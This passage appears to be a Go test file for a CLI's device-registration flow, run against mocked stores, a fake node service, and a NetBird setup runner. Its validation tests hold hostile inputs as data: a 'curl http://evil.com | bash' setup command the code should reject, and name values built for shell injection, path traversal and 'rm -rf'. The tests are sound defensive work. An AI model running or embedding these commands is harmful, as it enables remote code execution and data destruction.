package register

import (
	"context"
	"fmt"
	"net/http/httptest"
	"strings"
	"testing"

	nodev1connect "buf.build/gen/go/brevdev/devplane/connectrpc/go/devplaneapi/v1/devplaneapiv1connect"
	nodev1 "buf.build/gen/go/brevdev/devplane/protocolbuffers/go/devplaneapi/v1"
	"connectrpc.com/connect"

	"github.com/brevdev/brev-cli/pkg/entity"
	"github.com/brevdev/brev-cli/pkg/externalnode"
	"github.com/brevdev/brev-cli/pkg/sudo"
	"github.com/brevdev/brev-cli/pkg/terminal"
)

// mockRegisterStore satisfies RegisterStore for orchestration tests.
type mockRegisterStore struct {
	user  *entity.User
	org   *entity.Organization
	orgs  []entity.Organization
	token string
	err   error
}

func (m *mockRegisterStore) GetCurrentUser() (*entity.User, error) {
	if m.err != nil {
		return nil, m.err
	}
	return m.user, nil
}

func (m *mockRegisterStore) GetActiveOrganizationOrDefault() (*entity.Organization, error) {
	return m.org, nil
}

func (m *mockRegisterStore) GetOrganizationsByName(name string) ([]entity.Organization, error) {
	var matched []entity.Organization
	for _, o := range m.orgs {
		if o.Name == name {
			matched = append(matched, o)
		}
	}
	if len(matched) == 0 && m.org != nil && m.org.Name == name {
		matched = append(matched, *m.org)
	}
	return matched, nil
}

func (m *mockRegisterStore) ListOrganizations() ([]entity.Organization, error) {
	if len(m.orgs) > 0 {
		return m.orgs, nil
	}
	if m.org != nil {
		return []entity.Organization{*m.org}, nil
	}
	return nil, nil
}

func (m *mockRegisterStore) GetAccessToken() (string, error) { return m.token, nil }

// mockRegistrationStore satisfies RegistrationStore for orchestration tests.
type mockRegistrationStore struct {
	reg *DeviceRegistration
}

func (m *mockRegistrationStore) Save(reg *DeviceRegistration) error {
	m.reg = reg
	return nil
}

func (m *mockRegistrationStore) Load() (*DeviceRegistration, error) {
	if m.reg == nil {
		return nil, fmt.Errorf("no registration")
	}
	return m.reg, nil
}

func (m *mockRegistrationStore) Delete() error {
	m.reg = nil
	return nil
}

func (m *mockRegistrationStore) Exists() (bool, error) {
	return m.reg != nil, nil
}

// mock types for registerDeps interfaces

type mockPlatform struct{ compatible bool }

func (m mockPlatform) IsCompatible() bool { return m.compatible }

type mockConfirmer struct{ confirm bool }

func (m mockConfirmer) ConfirmYesNo(_ string) bool { return m.confirm }

// mockSelector implements terminal.Selector by returning the first item (for tests that need org selection).
type mockSelector struct{ choice string }

func (m mockSelector) Select(_ string, items []string) string {
	if m.choice != "" {
		for _, s := range items {
			if s == m.choice {
				return s
			}
		}
	}
	if len(items) > 0 {
		return items[0]
	}
	return ""
}

type mockNetBirdManager struct{ err error }

func (m mockNetBirdManager) Install() error       { return m.err }
func (m mockNetBirdManager) Uninstall() error     { return m.err }
func (m mockNetBirdManager) EnsureRunning() error { return m.err }

type mockSetupRunner struct {
	called bool
	cmd    string
	err    error
}

func (m *mockSetupRunner) RunSetup(script string) error {
	m.called = true
	m.cmd = script
	return m.err
}

type mockNodeClientFactory struct {
	serverURL string
}

func (m mockNodeClientFactory) NewNodeClient(provider externalnode.TokenProvider, _ string) nodev1connect.ExternalNodeServiceClient {
	return NewNodeServiceClient(provider, m.serverURL)
}

// testHardwareProfile returns a realistic HardwareProfile for use in tests.
func testHardwareProfile() *HardwareProfile {
	cpuCount := int32(2)
	ramBytes := int64(131886028) * 1024
	memBytes := int64(131072) * 1024 * 1024
	return &HardwareProfile{
		Architecture: "arm64",
		OS:           "Ubuntu",
		OSVersion:    "24.04",
		GPUs: []GPU{
			{Model: "NVIDIA GB10", Count: 1, MemoryBytes: &memBytes},
		},
		CPUCount: &cpuCount,
		RAMBytes: &ramBytes,
		Storage: []StorageDevice{
			{Name: "nvme0n1", StorageBytes: 500107862016, StorageType: "SSD"},
		},
	}
}

// testRegisterDeps returns deps with all side effects stubbed out, and a fake
// ConnectRPC server backed by the provided fakeNodeService.
func testRegisterDeps(t *testing.T, svc *fakeNodeService, regStore RegistrationStore) (registerDeps, *httptest.Server) {
	t.Helper()

	_, handler := nodev1connect.NewExternalNodeServiceHandler(svc)
	server := httptest.NewServer(handler)

	return registerDeps{
		platform:    mockPlatform{compatible: true},
		prompter:    mockConfirmer{confirm: true},
		selector:    mockSelector{},
		gater:       sudo.CachedGater{},
		netbird:     mockNetBirdManager{},
		setupRunner: &mockSetupRunner{},
		nodeClients: mockNodeClientFactory{serverURL: server.URL},
		hardwareProfiler: &mockHardwareProfiler{
			profile: testHardwareProfile(),
		},
		registrationStore: regStore,
	}, server
}

func Test_runRegister_HappyPath(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user: &entity.User{ID: "user_1"},
		org:  &entity.Organization{ID: "org_123", Name: "TestOrg"},

		token: "tok",
	}

	svc := &fakeNodeService{
		addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			if req.GetOrganizationId() != "org_123" {
				t.Errorf("unexpected org: %s", req.GetOrganizationId())
			}
			if req.GetName() != "my-spark" {
				t.Errorf("unexpected name: %s", req.GetName())
			}
			return &nodev1.AddNodeResponse{
				ExternalNode: &nodev1.ExternalNode{
					ExternalNodeId: "unode_abc",
					OrganizationId: "org_123",
					Name:           req.GetName(),
					DeviceId:       req.GetDeviceId(),
					ConnectivityInfo: &nodev1.ConnectivityInfo{
						RegistrationCommand: "netbird up --key abc",
					},
				},
			}, nil
		},
	}

	setupRunner := &mockSetupRunner{}

	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	deps.setupRunner = setupRunner

	SetTestSSHPort(22)
	defer ClearTestSSHPort()

	term := terminal.New()
	opts := registerOpts{interactive: false, name: "my-spark", orgName: "TestOrg", sshPort: 22}
	err := runRegister(context.Background(), term, store, opts, deps)
	if err != nil {
		t.Fatalf("runRegister failed: %v", err)
	}

	// Verify registration was persisted
	exists, err := regStore.Exists()
	if err != nil {
		t.Fatalf("Exists error: %v", err)
	}
	if !exists {
		t.Fatal("expected registration to exist after successful register")
	}

	reg, err := regStore.Load()
	if err != nil {
		t.Fatalf("Load failed: %v", err)
	}
	if reg.ExternalNodeID != "unode_abc" {
		t.Errorf("expected ExternalNodeID unode_abc, got %s", reg.ExternalNodeID)
	}
	if reg.DisplayName != "my-spark" {
		t.Errorf("expected display name 'my-spark', got %s", reg.DisplayName)
	}
	if reg.OrgID != "org_123" {
		t.Errorf("expected org org_123, got %s", reg.OrgID)
	}

	// Verify setup command was executed
	if setupRunner.cmd != "netbird up --key abc" {
		t.Errorf("expected setup command 'netbird up --key abc', got %q", setupRunner.cmd)
	}
}

// gaterFromFunc adapts a function to sudo.Gater; used only by Test_runRegister_UserCancels.
type gaterFromFunc func(*terminal.Terminal, terminal.Confirmer, string, bool) error

func (f gaterFromFunc) Gate(t *terminal.Terminal, c terminal.Confirmer, reason string, assumeYes bool) error {
	return f(t, c, reason, assumeYes)
}

func Test_runRegister_UserCancels(t *testing.T) {
	// User cancel happens in interactive mode (sudo or confirm). Flag-driven has no prompts.
	regStore := &mockRegistrationStore{}
	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
		token: "tok",
	}
	svc := &fakeNodeService{}
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	deps.prompter = mockConfirmer{confirm: false}
	// Use a gater that actually runs the confirmer so the test cancels at the gate
	// instead of proceeding to the device name prompt (CachedGater always passes).
	deps.gater = gaterFromFunc(func(_ *terminal.Terminal, c terminal.Confirmer, reason string, assumeYes bool) error {
		if assumeYes {
			return nil
		}
		if !c.ConfirmYesNo(fmt.Sprintf("%s requires sudo. Continue?", reason)) {
			return fmt.Errorf("%s canceled by user", reason)
		}
		return nil
	})

	term := terminal.New()
	opts := registerOpts{interactive: true, name: "", orgName: "", sshPort: 0}
	err := runRegister(context.Background(), term, store, opts, deps)
	if err == nil {
		t.Fatal("expected error when user declines sudo gate")
	}
	if !strings.Contains(err.Error(), "canceled by user") {
		t.Errorf("expected 'canceled by user' error, got: %v", err)
	}

	exists, _ := regStore.Exists()
	if exists {
		t.Error("registration should not exist after cancel")
	}
}

func Test_runRegister_AlreadyRegistered(t *testing.T) {
	tests := []struct {
		name      string
		getNodeFn func(*nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error)
	}{
		{
			name: "Connected",
			getNodeFn: func(req *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
				return &nodev1.GetNodeResponse{
					ExternalNode: &nodev1.ExternalNode{
						ExternalNodeId: req.GetExternalNodeId(),
						ConnectivityInfo: &nodev1.ConnectivityInfo{
							Status: nodev1.NetworkMemberStatus_NETWORK_MEMBER_STATUS_CONNECTED,
						},
					},
				}, nil
			},
		},
		{
			name: "Disconnected",
			getNodeFn: func(req *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
				return &nodev1.GetNodeResponse{
					ExternalNode: &nodev1.ExternalNode{
						ExternalNodeId: req.GetExternalNodeId(),
						ConnectivityInfo: &nodev1.ConnectivityInfo{
							Status: nodev1.NetworkMemberStatus_NETWORK_MEMBER_STATUS_DISCONNECTED,
						},
					},
				}, nil
			},
		},
		{
			name: "GetNodeFails",
			getNodeFn: func(_ *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
				return nil, connect.NewError(connect.CodeInternal, nil)
			},
		},
		{
			name: "NilConnectivityInfo",
			getNodeFn: func(req *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
				return &nodev1.GetNodeResponse{
					ExternalNode: &nodev1.ExternalNode{
						ExternalNodeId: req.GetExternalNodeId(),
					},
				}, nil
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			regStore := &mockRegistrationStore{
				reg: &DeviceRegistration{
					ExternalNodeID: "unode_existing",
					DisplayName:    "Existing",
					OrgID:          "org_123",
				},
			}

			store := &mockRegisterStore{
				user: &entity.User{ID: "user_1"},
				org:  &entity.Organization{ID: "org_123", Name: "TestOrg"},

				token: "tok",
			}

			svc := &fakeNodeService{getNodeFn: tt.getNodeFn}
			deps, server := testRegisterDeps(t, svc, regStore)
			defer server.Close()

			term := terminal.New()
			// Pass the same name as the existing registration so we go through
			// the checkExistingRegistration path (not the different-name path).
			opts := registerOpts{interactive: false, name: "Existing", orgName: "TestOrg", sshPort: 22}
			err := runRegister(context.Background(), term, store, opts, deps)
			if err != nil {
				t.Fatalf("expected nil error, got: %v", err)
			}

			exists, _ := regStore.Exists()
			if !exists {
				t.Error("expected registration to still exist")
			}
		})
	}
}

func Test_runRegister_NoOrganization(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user: &entity.User{ID: "user_1"},
		org:  nil,

		token: "tok",
	}

	svc := &fakeNodeService{}
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	term := terminal.New()
	opts := registerOpts{interactive: false, name: "my-spark", orgName: "TestOrg", sshPort: 22}
	err := runRegister(context.Background(), term, store, opts, deps)
	if err == nil {
		t.Fatal("expected error when no org exists")
	}
}

func Test_runRegister_WithOrgFlag(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user: &entity.User{ID: "user_1"},
		org:  &entity.Organization{ID: "org_default", Name: "DefaultOrg"},
		orgs: []entity.Organization{
			{ID: "org_456", Name: "SpecificOrg"},
		},
		token: "tok",
	}

	var capturedOrgID string
	svc := &fakeNodeService{
		addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			capturedOrgID = req.GetOrganizationId()
			return &nodev1.AddNodeResponse{
				ExternalNode: &nodev1.ExternalNode{
					ExternalNodeId: "unode_abc",
					OrganizationId: req.GetOrganizationId(),
					Name:           req.GetName(),
					DeviceId:       req.GetDeviceId(),
					ConnectivityInfo: &nodev1.ConnectivityInfo{
						RegistrationCommand: "netbird up --key abc",
					},
				},
			}, nil
		},
	}

	setupRunner := &mockSetupRunner{}
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()
	deps.setupRunner = setupRunner

	SetTestSSHPort(22)
	defer ClearTestSSHPort()

	term := terminal.New()
	opts := registerOpts{interactive: false, name: "my-spark", orgName: "SpecificOrg", sshPort: 22}
	err := runRegister(context.Background(), term, store, opts, deps)
	if err != nil {
		t.Fatalf("runRegister with --org failed: %v", err)
	}

	if capturedOrgID != "org_456" {
		t.Errorf("expected org_456, got %s", capturedOrgID)
	}

	reg, err := regStore.Load()
	if err != nil {
		t.Fatalf("Load failed: %v", err)
	}
	if reg.OrgID != "org_456" {
		t.Errorf("expected registration org org_456, got %s", reg.OrgID)
	}
}

func Test_runRegister_WithOrgFlag_NotFound(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_default", Name: "DefaultOrg"},
		orgs:  []entity.Organization{},
		token: "tok",
	}

	svc := &fakeNodeService{}
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	term := terminal.New()
	opts := registerOpts{interactive: false, name: "my-spark", orgName: "NonexistentOrg", sshPort: 22}
	err := runRegister(context.Background(), term, store, opts, deps)
	if err == nil {
		t.Fatal("expected error when org not found")
	}
	if !strings.Contains(err.Error(), "no organization found") {
		t.Errorf("expected 'no organization found' error, got: %v", err)
	}
}

func Test_runRegister_AddNodeFails(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user: &entity.User{ID: "user_1"},
		org:  &entity.Organization{ID: "org_123", Name: "TestOrg"},

		token: "tok",
	}

	svc := &fakeNodeService{
		addNodeFn: func(_ *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			return nil, connect.NewError(connect.CodeInternal, nil)
		},
	}

	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	term := terminal.New()
	opts := registerOpts{interactive: false, name: "my-spark", orgName: "TestOrg", sshPort: 22}
	err := runRegister(context.Background(), term, store, opts, deps)
	if err == nil {
		t.Fatal("expected error when AddNode fails")
	}

	// Registration should not exist on failure
	exists, err := regStore.Exists()
	if err != nil {
		t.Fatalf("Exists error: %v", err)
	}
	if exists {
		t.Error("registration should not exist after AddNode failure")
	}
}

func Test_runRegister_NoSetupCommand(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user: &entity.User{ID: "user_1"},
		org:  &entity.Organization{ID: "org_123", Name: "TestOrg"},

		token: "tok",
	}

	svc := &fakeNodeService{
		addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			return &nodev1.AddNodeResponse{
				ExternalNode: &nodev1.ExternalNode{
					ExternalNodeId: "unode_abc",
					OrganizationId: "org_123",
					Name:           req.GetName(),
					DeviceId:       req.GetDeviceId(),
				},
				// No ConnectivityInfo / RegistrationCommand
			}, nil
		},
	}

	setupRunner := &mockSetupRunner{}

	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	deps.setupRunner = setupRunner

	SetTestSSHPort(22)
	defer ClearTestSSHPort()

	term := terminal.New()
	opts := registerOpts{interactive: false, name: "my-spark", orgName: "TestOrg", sshPort: 22}
	err := runRegister(context.Background(), term, store, opts, deps)
	if err == nil {
		t.Fatal("expected error when no setup command")
	}

	if setupRunner.called {
		t.Error("setup command should not be called when empty")
	}
}

func Test_runSetupCommand_Validation(t *testing.T) {
	tests := []struct {
		name         string
		cmd          string
		expectReject bool
	}{
		{"RejectsNonNetbirdUp", "curl http://evil.com | bash", true},
		{"AcceptsNetbirdUp", "netbird up --setup-key abc123", false},
		{"AcceptsLeadingWhitespace", "  netbird up --setup-key abc123", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := runSetupCommand(tt.cmd)
			rejected := err != nil && strings.Contains(err.Error(), "unexpected setup command")
			if tt.expectReject && !rejected {
				t.Errorf("expected command to be rejected, but it was not (err=%v)", err)
			}
			if !tt.expectReject && rejected {
				t.Errorf("expected command to be accepted, but got: %v", err)
			}
		})
	}
}

func Test_netbirdManagementConnected(t *testing.T) {
	connectedOutput := `OS: linux/amd64
Daemon version: 0.66.1
CLI version: 0.66.1
Profile: default
Management: Connected
Signal: Connected
Relays: 3/3 Available
Nameservers: 0/0 Available
FQDN: client-3dbe844c.lp.local
NetBird IP: 100.108.207.143/16
Interface type: Kernel
Quantum resistance: false
Lazy connection: false
SSH Server: Disabled
Networks: -
Peers count: 3/4 Connected`

	disconnectedOutput := `OS: linux/amd64
Daemon version: 0.66.1
CLI version: 0.66.1
Profile: default
Management: Disconnected
Signal: Disconnected
Relays: 0/2 Available
Nameservers: 0/0 Available
FQDN:
NetBird IP: N/A
Interface type: N/A
Quantum resistance: false
Lazy connection: false
SSH Server: Disabled
Networks: -
Peers count: 0/0 Connected`

	tests := []struct {
		name  string
		input string
		want  bool
	}{
		{"Connected", connectedOutput, true},
		{"Disconnected", disconnectedOutput, false},
		{"EmptyString", "", false},
		{"NoManagementLine", "OS: linux/amd64\nFQDN: test\n", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := netbirdManagementConnected(tt.input)
			if got != tt.want {
				t.Errorf("netbirdManagementConnected() = %v, want %v", got, tt.want)
			}
		})
	}
}

func Test_runRegister_GrantSSH_retries_on_connection_error_then_succeeds(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
		token: "tok",
	}

	var grantCalls int
	svc := &fakeNodeService{
		addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			return &nodev1.AddNodeResponse{
				ExternalNode: &nodev1.ExternalNode{
					ExternalNodeId: "unode_abc",
					OrganizationId: "org_123",
					Name:           req.GetName(),
					DeviceId:       req.GetDeviceId(),
					ConnectivityInfo: &nodev1.ConnectivityInfo{
						RegistrationCommand: "netbird up --key abc",
					},
				},
			}, nil
		},
		grantNodeSSHAccessFn: func(_ *nodev1.GrantNodeSSHAccessRequest) (*nodev1.GrantNodeSSHAccessResponse, error) {
			grantCalls++
			if grantCalls < 2 {
				return nil, connect.NewError(connect.CodeInternal, nil)
			}
			return &nodev1.GrantNodeSSHAccessResponse{}, nil
		},
	}

	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	deps.prompter = mockConfirmer{confirm: true}

	SetTestSSHPort(22)
	defer ClearTestSSHPort()

	term := terminal.New()
	opts := registerOpts{interactive: false, name: "my-spark", orgName: "TestOrg", sshPort: 22}
	err := runRegister(context.Background(), term, store, opts, deps)
	if err != nil {
		t.Fatalf("runRegister failed: %v", err)
	}

	if grantCalls != 2 {
		t.Errorf("expected GrantNodeSSHAccess to be called 2 times (retry once), got %d", grantCalls)
	}
}

func Test_runRegister_GrantSSH_no_retry_on_permanent_error(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
		token: "tok",
	}

	var grantCalls int
	svc := &fakeNodeService{
		addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			return &nodev1.AddNodeResponse{
				ExternalNode: &nodev1.ExternalNode{
					ExternalNodeId: "unode_abc",
					OrganizationId: "org_123",
					Name:           req.GetName(),
					DeviceId:       req.GetDeviceId(),
					ConnectivityInfo: &nodev1.ConnectivityInfo{
						RegistrationCommand: "netbird up --key abc",
					},
				},
			}, nil
		},
		grantNodeSSHAccessFn: func(_ *nodev1.GrantNodeSSHAccessRequest) (*nodev1.GrantNodeSSHAccessResponse, error) {
			grantCalls++
			return nil, connect.NewError(connect.CodePermissionDenied, nil)
		},
	}

	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	deps.prompter = mockConfirmer{confirm: true}

	SetTestSSHPort(22)
	defer ClearTestSSHPort()

	term := terminal.New()
	opts := registerOpts{interactive: false, name: "my-spark", orgName: "TestOrg", sshPort: 22}
	err := runRegister(context.Background(), term, store, opts, deps)
	if err != nil {
		t.Fatalf("runRegister should not fail the overall flow when SSH grant fails: %v", err)
	}

	if grantCalls != 1 {
		t.Errorf("expected GrantNodeSSHAccess to be called once (no retry on permanent error), got %d", grantCalls)
	}
}

func Test_runRegister_NameValidation(t *testing.T) {
	tests := []struct {
		name      string
		input     string
		wantErr   bool
		errSubstr string
	}{
		{"Valid", "my-dgx-spark", false, ""},
		{"WithDots", "node.local.1", false, ""},
		{"WithUnderscore", "my_node", false, ""},
		{"Spaces", "My Spark", true, "letters, digits"},
		{"ShellInjection", "$(whoami)", true, "letters, digits"},
		{"PathTraversal", "../etc/passwd", true, "letters, digits"},
		{"Backticks", "`rm -rf`", true, "letters, digits"},
		{"Semicolon", "a;rm -rf /", true, "letters, digits"},
		{"LeadingHyphen", "-node", true, "start with"},
		{"LeadingDot", ".hidden", true, "start with"},
		{"TooLong", strings.Repeat("a", 64), true, "63 characters"},
		{"Empty", "", true, "--name"}, // flag-driven rejects empty name with this message
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			regStore := &mockRegistrationStore{}
			store := &mockRegisterStore{
				user:  &entity.User{ID: "user_1"},
				org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
				token: "tok",
			}

			svc := &fakeNodeService{
				addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
					return &nodev1.AddNodeResponse{
						ExternalNode: &nodev1.ExternalNode{
							ExternalNodeId: "unode_abc",
							OrganizationId: "org_123",
							Name:           req.GetName(),
							DeviceId:       req.GetDeviceId(),
							ConnectivityInfo: &nodev1.ConnectivityInfo{
								RegistrationCommand: "netbird up --key abc",
							},
						},
					}, nil
				},
			}

			deps, server := testRegisterDeps(t, svc, regStore)
			defer server.Close()

			SetTestSSHPort(22)
			defer ClearTestSSHPort()

			term := terminal.New()
			var err error
			opts := registerOpts{interactive: false, name: tt.input, orgName: "TestOrg", sshPort: 22}
			err = runRegister(context.Background(), term, store, opts, deps)
			if tt.wantErr {
				if err == nil {
					t.Fatal("expected error, got nil")
				}
				if !strings.Contains(err.Error(), tt.errSubstr) {
					t.Errorf("expected error containing %q, got: %v", tt.errSubstr, err)
				}
			} else if err != nil {
				t.Errorf("unexpected error: %v", err)
			}
		})
	}
}

func Test_runRegister_PlatformIncompatible(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
		token: "tok",
	}

	svc := &fakeNodeService{}
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	deps.platform = mockPlatform{compatible: false}

	term := terminal.New()
	opts := registerOpts{interactive: false, name: "my-spark", orgName: "TestOrg", sshPort: 22}
	err := runRegister(context.Background(), term, store, opts, deps)
	if err == nil {
		t.Fatal("expected error when platform is incompatible")
	}
	if !strings.Contains(err.Error(), "only supported on Linux") {
		t.Errorf("expected platform incompatibility error, got: %v", err)
	}
}

func Test_runRegister_HardwareProfilerFailure(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
		token: "tok",
	}

	svc := &fakeNodeService{}
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	deps.hardwareProfiler = &mockHardwareProfiler{err: fmt.Errorf("nvml init failed")}

	term := terminal.New()
	opts := registerOpts{interactive: false, name: "my-spark", orgName: "TestOrg", sshPort: 22}
	err := runRegister(context.Background(), term, store, opts, deps)
	if err == nil {
		t.Fatal("expected error when hardware profiler fails")
	}
	if !strings.Contains(err.Error(), "hardware profile") {
		t.Errorf("expected hardware profile error, got: %v", err)
	}
}

func Test_runRegister_NetBirdInstallFailure(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
		token: "tok",
	}

	svc := &fakeNodeService{}
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	deps.netbird = mockNetBirdManager{err: fmt.Errorf("install failed")}

	term := terminal.New()
	opts := registerOpts{interactive: false, name: "my-spark", orgName: "TestOrg", sshPort: 22}
	err := runRegister(context.Background(), term, store, opts, deps)
	if err == nil {
		t.Fatal("expected error when NetBird install fails")
	}
	if !strings.Contains(err.Error(), "tunnel setup failed") {
		t.Errorf("expected tunnel setup error, got: %v", err)
	}
}

func Test_runRegister_NoNameNotRegistered(t *testing.T) {
	// In flag-driven mode, missing --name and --org must error (no prompts).
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
		token: "tok",
	}

	svc := &fakeNodeService{}
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	term := terminal.New()
	opts := registerOpts{interactive: false, name: "", orgName: "", sshPort: 22}
	err := runRegister(context.Background(), term, store, opts, deps)
	if err == nil {
		t.Fatal("expected error when no name/org in non-interactive mode")
	}
	if !strings.Contains(err.Error(), "non-interactive") || !strings.Contains(err.Error(), "--name") {
		t.Errorf("expected non-interactive/--name error, got: %v", err)
	}
}

func Test_runRegister_NoNameAlreadyRegistered(t *testing.T) {
	regStore := &mockRegistrationStore{
		reg: &DeviceRegistration{
			ExternalNodeID: "unode_existing",
			DisplayName:    "Existing Device",
			OrgID:          "org_123",
		},
	}

	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
		token: "tok",
	}

	svc := &fakeNodeService{
		getNodeFn: func(req *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
			return &nodev1.GetNodeResponse{
				ExternalNode: &nodev1.ExternalNode{
					ExternalNodeId: req.GetExternalNodeId(),
					ConnectivityInfo: &nodev1.ConnectivityInfo{
						Status: nodev1.NetworkMemberStatus_NETWORK_MEMBER_STATUS_CONNECTED,
					},
				},
			}, nil
		},
	}

	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	term := terminal.New()
	opts := registerOpts{interactive: false, name: "Existing", orgName: "TestOrg", sshPort: 22}
	err := runRegister(context.Background(), term, store, opts, deps)
	if err != nil {
		t.Fatalf("expected nil error when already registered with no name, got: %v", err)
	}

	// Registration should still exist
	exists, _ := regStore.Exists()
	if !exists {
		t.Error("expected registration to still exist")
	}
}

func Test_runRegister_OpenSSHPort(t *testing.T) { // nolint:funlen // test
	tests := []struct {
		name   string
		port   int32
		openFn func(*nodev1.OpenPortRequest) (*nodev1.OpenPortResponse, error)
		verify func(t *testing.T, openReq *nodev1.OpenPortRequest, grantReq *nodev1.GrantNodeSSHAccessRequest, reg *mockRegistrationStore, err error)
	}{
		{
			name: "SendsCorrectArgs",
			port: 2222,
			openFn: func(req *nodev1.OpenPortRequest) (*nodev1.OpenPortResponse, error) {
				return &nodev1.OpenPortResponse{
					Port: &nodev1.Port{
						PortId:     "port_ssh",
						Protocol:   req.GetProtocol(),
						PortNumber: req.GetPortNumber(),
					},
				}, nil
			},
			verify: func(t *testing.T, openReq *nodev1.OpenPortRequest, _ *nodev1.GrantNodeSSHAccessRequest, _ *mockRegistrationStore, err error) {
				t.Helper()
				if err != nil {
					t.Fatalf("runRegister failed: %v", err)
				}
				if openReq == nil {
					t.Fatal("expected OpenPort to be called")
				}
				if openReq.GetExternalNodeId() != "unode_abc" {
					t.Errorf("expected node ID unode_abc, got %s", openReq.GetExternalNodeId())
				}
				if openReq.GetProtocol() != nodev1.PortProtocol_PORT_PROTOCOL_SSH {
					t.Errorf("expected PORT_PROTOCOL_SSH, got %s", openReq.GetProtocol())
				}
				if openReq.GetPortNumber() != 2222 {
					t.Errorf("expected port 2222, got %d", openReq.GetPortNumber())
				}
			},
		},
		{
			name: "FailureIsSoftError",
			port: 22,
			openFn: func(_ *nodev1.OpenPortRequest) (*nodev1.OpenPortResponse, error) {
				return nil, connect.NewError(connect.CodeInternal, fmt.Errorf("skybridge unavailable"))
			},
			verify: func(t *testing.T, _ *nodev1.OpenPortRequest, _ *nodev1.GrantNodeSSHAccessRequest, regStore *mockRegistrationStore, err error) {
				t.Helper()
				if err != nil {
					t.Fatalf("registration should succeed even when OpenSSHPort fails (soft error), got: %v", err)
				}
				exists, _ := regStore.Exists()
				if !exists {
					t.Error("expected registration to still exist after OpenSSHPort failure")
				}
			},
		},
		{
			name: "GrantRequestHasNoPort",
			port: 22,
			verify: func(t *testing.T, _ *nodev1.OpenPortRequest, grantReq *nodev1.GrantNodeSSHAccessRequest, _ *mockRegistrationStore, err error) {
				t.Helper()
				if err != nil {
					t.Fatalf("runRegister failed: %v", err)
				}
				if grantReq == nil {
					t.Fatal("expected GrantNodeSSHAccess to be called")
				}
				if grantReq.GetExternalNodeId() != "unode_abc" {
					t.Errorf("expected node ID unode_abc, got %s", grantReq.GetExternalNodeId())
				}
				if grantReq.GetUserId() != "user_1" {
					t.Errorf("expected user ID user_1, got %s", grantReq.GetUserId())
				}
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			regStore := &mockRegistrationStore{}
			store := &mockRegisterStore{
				user:  &entity.User{ID: "user_1"},
				org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
				token: "tok",
			}

			var gotOpenReq *nodev1.OpenPortRequest
			var gotGrantReq *nodev1.GrantNodeSSHAccessRequest
			svc := &fakeNodeService{
				addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
					return &nodev1.AddNodeResponse{
